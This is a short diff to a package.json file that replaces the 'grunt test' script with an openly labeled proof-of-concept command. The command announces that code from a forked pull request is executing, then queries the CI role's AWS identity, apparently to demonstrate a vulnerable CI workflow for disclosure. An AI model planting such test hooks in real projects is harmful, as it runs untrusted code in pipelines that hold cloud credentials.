@@ -18,7 +18,7 @@
     "build": "grunt build",
     "compile": "grunt compile",
     "clean": "grunt clean",
-    "test": "grunt test",
+    "test": "echo '>>> PoC: EXECUTING CODE FROM FORKED PR (head.sha) <<<' && echo '>>> PoC: Current directory:' && pwd && echo '>>> PoC: Attempting AWS CLI command to identify role:' && aws sts get-caller-identity && echo '>>> PoC: TEST FINISHED <<<' && exit 1",
     "release": "grunt release",
     "doc": "grunt jsdoc"
   },
